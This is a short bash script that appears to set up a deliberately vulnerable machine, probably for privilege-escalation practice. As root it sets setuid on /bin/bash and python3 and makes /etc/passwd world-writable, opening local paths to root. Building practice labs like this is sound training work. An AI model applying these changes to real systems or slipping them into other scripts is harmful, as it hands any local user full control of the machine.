#!/bin/bash

#to be run after apachepost.sh
#basic priv esc ideas

### --- Preliminary Checks ---
if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root. Please run with sudo."
    exit 1
fi

#suid bits for /bin/bash, can lead to root shell
sudo chmod u+s /bin/bash

#make /etc/passwd writeable, can create other root users
sudo chmod o+w /etc/passwd

#suid bits for /usr/lib/python, can lead to root shell
sudo chmod u+s /usr/bin/python3